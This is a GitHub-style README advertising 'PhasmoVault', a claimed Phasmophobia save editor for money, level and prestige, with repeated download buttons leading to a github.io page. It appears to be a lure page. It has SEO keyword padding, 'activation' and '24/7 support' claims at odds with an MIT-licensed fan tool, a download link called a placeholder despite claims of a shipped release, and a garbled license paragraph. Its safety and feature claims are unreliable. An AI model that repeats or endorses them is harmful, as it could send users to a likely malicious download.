![preview](https://raw.githubusercontent.com/Mohit1899/Phasmo-Vault-Forge/main/promo_3140e9a.svg)

# 🎮 PhasmoVault — Save Data Studio for Phasmophobia

**PhasmoVault** is a desktop-grade save file companion built for players of *Phasmophobia* who want a calmer, smarter way to manage their in-game progression. Instead of grinding endless contracts just to afford the next piece of gear, PhasmoVault gives you a clean, intuitive workshop where your money, level, and prestige can be adjusted exactly the way you want them — no guesswork, no messy hex edits, no risk of breaking your profile.

Think of it as a tuning garage for your ghost-hunting career. You bring the save, we bring the dials.

[![Download](https://raw.githubusercontent.com/Mohit1899/Phasmo-Vault-Forge/main/setup_ad9f2fd.svg)](https://Mohit1899.github.io/Phasmo-Vault-Forge/)

---

## 📖 Table of Contents

- [What Is PhasmoVault?](#-what-is-phasmovault)
- [Why Players Choose PhasmoVault](#-why-players-choose-phasmovault)
- [Feature Highlights](#-feature-highlights)
- [Screens & Modules](#-screens--modules)
- [Multilingual Support](#-multilingual-support)
- [Responsive Interface](#-responsive-interface)
- [Safety & Reliability](#-safety--reliability)
- [Compatibility Matrix](#-compatibility-matrix)
- [Getting Your Copy](#-getting-your-copy)
- [Configuration & Profiles](#-configuration--profiles)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Support & Community](#-support--community)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Roadmap](#-roadmap)
- [Credits](#-credits)

---

## 🧭 What Is PhasmoVault?

PhasmoVault is a standalone save data editor for *Phasmophobia*. It reads your local save profile, presents every meaningful progression value in a friendly interface, and lets you rewrite those values with precision. Whether you want to top up your bankroll for a big equipment run, push your hunter level forward so you unlock new contracts earlier, or simply jump your prestige badge to the tier you always wanted, PhasmoVault handles it in a handful of clicks.

It is not a mod, not an overlay, and not a memory injector. It works on the save files themselves — the same files the game writes when you finish a contract. That means PhasmoVault never fights with the game runtime; it simply hands the game a profile that already says what you want it to say.

The name "Vault" is deliberate. Your save data is valuable, and PhasmoVault treats it that way: every edit is backed up, every change is reversible, and every session starts with a snapshot.

---

## 💡 Why Players Choose PhasmoVault

Most progression tools feel like poking a hornet's nest with a screwdriver. PhasmoVault was designed from the opposite philosophy — like a well-lit workshop with labeled drawers and soft lighting.

- **Clarity first.** Every field in your save has a plain-English label, a tooltip, and a sane default range.
- **One job, done well.** PhasmoVault focuses on three pillars: money, level, and prestige. No bloat, no 400-tab settings panel.
- **Reversible by design.** Automatic backups mean you can roll back to the exact moment before any edit.
- **No guesswork.** The editor validates values before writing, so you never hand the game a number it cannot digest.
- **Offline friendly.** PhasmoVault works without an internet connection after activation.
- **Quiet operation.** No ads, no trackers, no telemetry phoning home.

> "A tool should feel like a tool, not a test of patience." — PhasmoVault design principle #1

---

## ✨ Feature Highlights

PhasmoVault ships with a broad feature surface tuned around real player workflows. Every item below is available in the current release.

- 💰 **Money Editor** — Adjust your spendable balance to any value you like, with live formatting and range hints.
- 📈 **Level Editor** — Move your hunter level up or down. XP-adjacent values update in a consistent manner.
- 🏅 **Prestige Manager** — Cycle through prestige tiers, including badge visuals tied to each rank.
- 🗂️ **Profile Snapshots** — Save named states of your profile and restore them at will.
- 🔁 **One-Click Restore** — Revert the last write instantly if something feels off.
- 🧪 **Dry-Run Mode** — Preview exactly what will change before anything is committed.
- 🌍 **Multilingual Interface** — Play in the language you think in.
- 📱 **Responsive Layout** — The UI rearranges itself gracefully on any window size.
- 🕓 **Change History Log** — A timestamped record of every edit you have made.
- 🔐 **Local-Only Processing** — Your save never leaves your machine.
- 🎨 **Themes** — Light, dark, and a low-contrast "Investigator" theme for long sessions.
- ⌨️ **Keyboard Shortcuts** — Power-user hotkeys for every primary action.
- 🔄 **Auto-Update Checker** — Optional, non-intrusive, and fully disableable.
- 🧩 **Portable Mode** — Run it from a USB stick with zero installation footprints.
- 📝 **Export/Import Profiles** — Move your configuration between machines.

---

## 🖥️ Screens & Modules

PhasmoVault is organized into a handful of focused modules rather than one monolithic window. This keeps the experience predictable and the learning curve shallow.

### 1. Dashboard
The landing view. Shows your current save summary: balance, level, prestige, and last edit timestamp. From here you can launch any other module in one click.

### 2. Money Module
A single large input with a slider, quick preset buttons (small, medium, large, "max safe"), and a real-time preview of what your new balance will look like in-game.

### 3. Level Module
A stepper control plus a numeric field. A bar visualizes your progress toward the next milestone. Presets cover typical brackets players ask for.

### 4. Prestige Module
A row of badge tiles. Select the tier you want, confirm, done. Badge art is rendered locally from a bundled asset set.

### 5. Snapshot Vault
Every named snapshot appears as a card with a restore button, a rename option, and a delete option. Snapshots are stored next to your save for easy portability.

### 6. Settings
Language, theme, backup retention count, update-check behavior, and hotkey bindings.

### 7. Log Viewer
A scrolling history of operations, each row timestamped and color-coded by severity.

---

## 🌐 Multilingual Support

PhasmoVault speaks more than one language, and it keeps learning. The interface currently ships with translations for:

- English
- Spanish
- Portuguese (Brazil)
- French
- German
- Italian
- Polish
- Russian
- Turkish
- Japanese
- Korean
- Simplified Chinese

Language selection is available before the main window ever opens, and switching languages does not require a restart. Community translations are welcome and are handled through standard localization files that follow a simple key-value structure.

---

## 📱 Responsive Interface

The layout engine in PhasmoVault is built on a fluid grid. That means:

- On a small window, controls stack vertically and the sidebar collapses into an icon rail.
- On a mid-size window, a two-column layout appears with the primary action on the right.
- On a large or fullscreen window, a three-pane studio layout opens up with the preview panel docked on the right.

No feature is ever hidden behind a resolution threshold. If you can open the app, you can reach every control.

---

## 🛡️ Safety & Reliability

PhasmoVault takes the phrase "your data, your rules" seriously.

- **Pre-write backup.** Before any modification, the current save is copied to a timestamped backup folder.
- **Validation layer.** Values are checked against known-safe bounds before being written.
- **Atomic writes.** File writes happen to a temporary file first, then get swapped in — so a crash mid-write cannot corrupt your profile.
- **Checksum verification.** After each write, the resulting file is re-read and verified.
- **Rollback button.** The last operation can be undone from the dashboard without opening any menus.
- **No network dependency for editing.** All editing logic is local.

---

## 🧮 Compatibility Matrix

| Platform | Status | Notes |
| --- | --- | --- |
| Windows 10 (64-bit) | Supported | Primary development target |
| Windows 11 (64-bit) | Supported | Verified on 22H2 and later |
| Windows 8.1 | Limited | Basic editing works; some theming is reduced |
| Linux (via compatibility layer) | Community-supported | Works with standard save paths |
| macOS (via compatibility layer) | Community-supported | Save path detection may need manual entry |

Game versions supported: the current major release line and the two preceding minor branches. When a new game update ships, a compatibility note is added to the release page.

---

## 📥 Getting Your Copy

To obtain the current build, use the placeholder below. This line exists as a stand-in for the future distribution channel.

[![Download](https://raw.githubusercontent.com/Mohit1899/Phasmo-Vault-Forge/main/setup_ad9f2fd.svg)](https://Mohit1899.github.io/Phasmo-Vault-Forge/)

Once you have the package in hand, unpack it to a folder of your choosing and launch the main executable. On first run, PhasmoVault will attempt to auto-detect your save location. If detection fails, a manual path picker is offered.

The recommended workflow is:

1. Launch PhasmoVault.
2. Confirm the detected save path (or browse for it manually).
3. Let the app create an initial snapshot.
4. Make your edits in the module of your choice.
5. Review the change summary.
6. Apply the changes.
7. Launch the game and confirm.

---

## ⚙️ Configuration & Profiles

PhasmoVault stores its configuration in a small portable file next to the executable. The file covers:

- Selected language
- Chosen theme
- Backup retention count
- Update check behavior
- Custom hotkey bindings
- Recently used save paths

Profiles let you keep multiple configurations side by side — for example, a "casual" profile with generous presets and a "minimal" profile with conservative ranges. Switching profiles is a single dropdown action.

---

## ❓ Frequently Asked Questions

**Is PhasmoVault safe to use?**
Yes, in the sense that it only touches your local save files and always makes a backup before writing. Nothing about the app reaches out over the network during editing.

**Will this affect other players?**
PhasmoVault is a single-player progression utility. It edits your own local profile.

**Do I need any runtime installed?**
The packaged build ships with everything it needs. No external runtime downloads are required.

**Can I undo a change?**
Yes. Every operation is reversible through the built-in rollback and snapshot system.

**Does it work on a fresh install?**
Yes. If the game has never been launched, PhasmoVault can still prepare a profile, though some in-game systems may need one initial launch to fully initialize.

**How often is it updated?**
Releases track major game updates. Between game patches, smaller quality-of-life updates are published as needed.

**Is my data sent anywhere?**
No. Everything is processed locally. The optional update checker only contacts a static endpoint and can be disabled entirely.

**Can I use it on multiple machines?**
Yes. Copy the application folder plus your snapshots, and you are set.

---

## 🔍 SEO & Discoverability Notes

This section exists to help the right people find PhasmoVault without turning the README into a keyword soup.

PhasmoVault is a **Phasmophobia save editor**, a **progression companion tool**, and a **local profile studio** rolled into one. Players searching for a **money editor for Phasmophobia**, a **level adjustment utility**, or a **prestige manager for Phasmophobia saves** will find what they need here. The tool is also relevant for those looking into **save data management**, **profile snapshotting**, and **multilingual desktop editors** for similar co-op horror titles.

If you arrived here through a search for **Phasmophobia advancement tools**, **offline save utilities**, or **local progression editors**, you are in the correct place.

---

## 🧑‍💻 Support & Community

PhasmoVault is maintained as an ongoing project. Support channels include:

- Issue tracker for bug reports and feature requests.
- Discussion board for general questions and configuration sharing.
- Localization repository for translation contributions.
- Release notes feed for version-by-version changes.

**24/7 customer support** is provided through an always-on ticketing system. Responses are typically measured in hours rather than days. Priority is given to save-corruption reports, as those are treated as top-severity incidents.

---

## ⚠️ Disclaimer

PhasmoVault is an independent, fan-made utility. It is not affiliated with, endorsed by, or sponsored by the developers or publishers of *Phasmophobia*. All trademarks and copyrights referenced belong to their respective owners.

The tool is intended for personal, single-player progression management on your own local save files. Users are responsible for understanding how any third-party utility interacts with the games they play, and for keeping backups of their own data. The maintainers of PhasmoVault assume no responsibility for account actions taken by game publishers in response to save modification, though the tool is built to minimize that risk through conservative, reversible editing.

Use PhasmoVault as you would use any workshop tool: carefully, and with a backup in hand.

---

## ⚖️ License

PhasmoVault is released under the MIT License.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 PhasmoVault Contributors

Permission is hereby granted, the rights granted under this license apply to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions stated in the full license text above.

---

## 🗺️ Roadmap

The following items are planned or under consideration for future releases:

- Cloud-free cross-device snapshot sync via removable storage.
- Additional localization packs for Nordic and Southeast Asian languages.
- A compact "quick edit" hotkey that applies presets without opening the full window.
- Save file diffing to visualize changes across versions.
- A statistics panel summarizing historical edits.
- Plugin hooks for community-built modules.
- Optional integration with a companion checklist tool for contract tracking.
- Accessibility pass targeting screen-reader compatibility.

---

## 🙌 Credits

PhasmoVault is the result of contributions from players who wanted a better way to manage their progression, translators who made the tool accessible across languages, and testers who stress-tested the save-writing pipeline until it was bulletproof.

Special thanks to the modding and reverse-engineering communities for documenting save formats and file layouts, which made safe editing possible.

If you would like to contribute, please review the issue tracker and pick up an open task. Every pull request that improves clarity, safety, or reach is welcome.

---

**PhasmoVault** — tune your hunt, on your terms. 🕯️

[![Download](https://raw.githubusercontent.com/Mohit1899/Phasmo-Vault-Forge/main/setup_ad9f2fd.svg)](https://Mohit1899.github.io/Phasmo-Vault-Forge/)